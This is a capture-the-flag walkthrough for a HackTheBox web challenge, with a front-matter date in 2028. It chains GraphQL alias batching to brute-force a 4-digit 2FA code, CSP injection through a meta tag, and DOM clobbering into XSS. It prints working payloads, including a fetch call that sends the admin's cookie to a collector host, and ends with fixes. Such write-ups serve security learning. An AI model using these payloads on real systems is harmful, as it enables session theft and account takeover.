---
layout: post
title: "BatchCraft Potions"
date: 2028-03-20 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, graphql, 2fa-bypass, dom-clobbering, csp, xss, jwt]
description: "A potions shop where the flag lives inside the admin bot's JWT cookie. GraphQL alias batching brute-forces a 4-digit 2FA in seconds, then a user-controlled meta tag injects a second CSP that disables the one script defending against DOM clobbering — turning a filtered product description into an XSS that leaks the bot's cookie."
---

## Overview

BatchCraft Potions is a Medium web challenge built on Node/Express with GraphQL auth, TOTP 2FA, and a puppeteer admin bot that reviews submitted products. The flag never touches the database — it's baked into the **admin bot's JWT session cookie** (`sign({username:'admin', verified:true, flag})`). So the whole challenge is: become a verified vendor, then XSS the bot and read its cookie.

## Step 1 — GraphQL batching to brute-force 2FA

Credentials are hardcoded in the DB migration: `vendor53:PotionsFTW!`. `LoginUser` returns a JWT with `verified:false`; everything useful needs `verify2FA(otp)` → `verified:true`. Two design choices make brute-force trivial:

- `authenticator.options = { digits: 4 }` — the OTP is only **4 digits** (10,000 values).
- GraphQL runs **many aliased mutations in a single request**, so per-request rate limiting is useless.

Batch 1,000 guesses per request:

```graphql
mutation($o0000:String!, $o0001:String!, ...) {
  o0000: verify2FA(otp:$o0000){token}
  o0001: verify2FA(otp:$o0001){token}
  ...
}
```

Ten requests cover 0000–9999; whichever alias matches the current TOTP returns a `verified:true` token.

## Step 2 — Injecting a CSP to disable a defensive script

The product preview renders a filtered meta block whose baked-in CSP is `script-src 'self' 'unsafe-inline'`. `'unsafe-inline'` already permits inline event handlers — the only obstacle is `global.js`, which defines the genuine `window.potionTypes` array and would overwrite any clobbered version.

`generateMeta` interpolates our `product_og_desc` straight into `<meta property="og:description" content="${description}" />` before DOMPurify (which allows `<meta http-equiv content>`). Break out of the attribute and inject a **second CSP** whose `script-src` allowlist deliberately **omits `global.js`**:

```
script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js" http-equiv="Content-Security-Policy
```

Multiple CSPs combine as their **intersection**, so `global.js` is now blocked while `jquery` and `product.js` still load.

## Step 3 — DOM clobbering → XSS

With `global.js` gone, `window.potionTypes` is undefined, so we **clobber** it from the DOMPurify-filtered `product_desc` (which allows `<a>`/`<img>` with `id`/`name`):

```html
<a id="potionTypes"></a>
<img id="1" name="potionTypes" src="cid:x\' onerror='fetch(`http://COLLECTOR/`+document.cookie,{mode:`no-cors`})'">
```

Two elements named `potionTypes` clobber it into an `HTMLCollection`; `potionTypes[1]` is the `<img>` (its `id="1"`). Then `product.js` runs:

```js
if (product.data('category') == potionTypes[i].id)          // product_category=1 matches img id "1"
    product.prepend(`<img src='${potionTypes[i].src}' ...>`) // src = our string, re-parsed as HTML
```

`potionTypes[1].src` is the raw attribute `cid:x\' onerror='fetch(...)'`; jQuery `.prepend()` parses it as HTML, the `\'` breaks out of the `src` quote, and the `onerror` fires — sending the admin's `document.cookie` to our collector.

## Step 4 — Exfil and decode

The bot has outbound access; a [webhook.site](https://webhook.site) token makes a fine collector. The exfiltrated `document.cookie` **is** the admin JWT, so base64-decoding its middle segment yields the flag directly:

```json
{"username":"admin","verified":true,"flag":"HTB{...}","iat":...}
```

## Why it worked

- A TOTP shortened to 4 digits plus GraphQL alias batching = an unauthenticated 10k brute-force in seconds.
- Injecting a **stricter** CSP is offensive, not defensive: intersecting CSPs let an attacker selectively **disable a same-origin script** to keep a DOM-clobbering gadget alive.
- `'unsafe-inline'` plus a script that feeds a clobberable value into an HTML sink (`.prepend`) turns DOM clobbering into full XSS.

## Fix / defense

- Never shorten OTP digits; rate-limit per account/action (not per HTTP request) and cap GraphQL aliases/batch size.
- Don't let user input flow into `<meta>`/CSP content; build meta from an allowlist and reject attacker-supplied CSP directives.
- Use module-scoped `const potionTypes` (not `window.potionTypes`); never pass `element.src` into an HTML sink — use `.attr('src', …)`.
- Keep secrets out of the JWT and set `httpOnly` on session cookies so XSS can't read them.
